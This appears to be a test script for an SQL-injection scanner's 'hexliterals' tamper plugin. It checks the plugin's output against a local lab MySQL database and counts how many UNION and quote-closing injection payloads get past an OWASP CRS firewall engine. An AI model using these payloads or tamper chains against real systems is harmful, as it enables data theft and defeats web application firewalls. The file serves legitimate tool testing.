// hexliterals 专项回归：doctest 自检 + 真实 MySQL 语义等价 + CRS 静态绕过 + 与 quote2hex 安全性对比
import { resolve, dirname } from 'node:path';
import { fileURLToPath } from 'node:url';
import { createRequire } from 'node:module';
const require = createRequire(new URL('../../server/package.json', import.meta.url));
const HERE = dirname(fileURLToPath(import.meta.url));
const { applyTampers } = require(resolve(HERE, '../../server/src/core/tamper/applyTampers.js'));
const { tamperRegistry } = require(resolve(HERE, '../../server/src/core/tamper/TamperRegistry.js'));
const { evaluate } = await import(new URL('./crs-engine.js', import.meta.url).href);
const mysql = require('mysql2/promise');

// —— 1) doctest 自检 ——
const p = tamperRegistry.get('hexliterals');
let bad = 0;
for (const d of p.doctests) {
  const got = p.transform(d.input, {});
  const ok = got === d.output;
  if (!ok) bad++;
  console.log(`${ok ? 'OK  ' : 'FAIL'} ${JSON.stringify(d.input)} → ${JSON.stringify(got)}${ok ? '' : ` 期望 ${JSON.stringify(d.output)}`}`);
}
console.log(`doctest: ${p.doctests.length - bad}/${p.doctests.length}`);

// —— 2) 真实 MySQL 语义等价 ——
const pool = mysql.createPool({ host: process.env.MYSQL_HOST ?? '127.0.0.1', port: Number(process.env.MYSQL_PORT) || 3306, user: process.env.MYSQL_USER ?? 'root', password: process.env.MYSQL_PASSWORD ?? 'root', database: process.env.MYSQL_DATABASE || 'sqli_lab' });
const CASES = [
  "SELECT 'SQLISCANNER0'",
  "SELECT CONCAT('__S__',version())",
  "SELECT 1 WHERE 'a'='a'",
  "SELECT 1 WHERE BINARY 'abc'='abc'",
  "SELECT CHAR_LENGTH('SQLISCANNER0')",
];
console.log('\n—— MySQL 语义等价 ——');
for (const sql of CASES) {
  const t = applyTampers(sql, { dbms: 'MySQL', config: {} }, ['hexliterals']);
  let a, b;
  try { [a] = await pool.query(sql); } catch (e) { a = [{ err: e.message.slice(0, 40) }]; }
  try { [b] = await pool.query(t); } catch (e) { b = [{ err: e.message.slice(0, 40) }]; }
  // 只比「值」不比列名（列名必然不同）；mysql2 把 0x.. 返回为 Buffer，统一转 utf8 字符串
  const norm = (rows) => JSON.stringify((rows || []).map((r) => Object.values(r).map((v) => (Buffer.isBuffer(v) ? v.toString('utf8') : v))));
  const same = norm(a) === norm(b);
  console.log(`${same ? 'OK  ' : 'FAIL'} ${norm(a)} vs ${norm(b)}`);
}
await pool.end();

// —— 3) CRS 静态绕过（含 UNION 列探测标记样本）——
const SAMPLES = [
  "1 UNION SELECT 'SQLISCANNER0','SQLISCANNER1'",
  "1 UNION SELECT 'SQLISCANNER0','SQLISCANNER1','SQLISCANNER2','SQLISCANNER3'",
  "1' AND 'a'='a'#",
  "1' UNION SELECT NULL,CONCAT('__S__',CAST((version()) AS CHAR),'__E__'),NULL,NULL#",
];
const CHAINS = { off: null, dash2hash: ['dash2hash'], hexliterals: ['hexliterals'], 'd2h+hexliterals': ['dash2hash', 'hexliterals'] };
console.log('\n—— CRS v4.1.0 静态 ——');
for (const [label, chain] of Object.entries(CHAINS)) {
  let pass = 0;
  const notes = [];
  for (const s of SAMPLES) {
    const t = chain ? applyTampers(s, { dbms: 'MySQL', config: {} }, chain) : s;
    const r = evaluate({ uri: '/num?id=1', queryString: `id=${encodeURIComponent(t)}`, args: { id: t }, cookies: {}, headers: {} });
    if (!r.blocked) pass++; else notes.push(`${r.ruleId}:${t.slice(0, 60)}`);
  }
  console.log(`${label.padEnd(16)} 绕过 ${pass}/${SAMPLES.length}`);
  for (const n of notes) console.log(`     拦 ${n}`);
}

// —— 4) 与 quote2hex 安全性对比：闭合引号型 payload ——
console.log('\n—— 安全性对比（闭合引号型 payload）——');
const DANGER = "1' UNION SELECT NULL,CONCAT('__S__',version(),'__E__')#";
const q2h = tamperRegistry.get('quote2hex').transform(DANGER, {});
const hex = tamperRegistry.get('hexliterals').transform(DANGER, {});
console.log(`quote2hex    ${q2h.slice(0, 110)}`);
console.log(`  → ${/^1'0x|UNION/.test(q2h) ? '' : '⚠ 闭合引号后的 SQL 代码被整体十六进制化（语义毁灭）'}`);
console.log(`hexliterals  ${hex.slice(0, 110)}`);
console.log(`  → ${hex.includes('UNION SELECT') ? 'SQL 结构完整保留 ✅' : '⚠ 结构被破坏'}`);
process.exit(0);
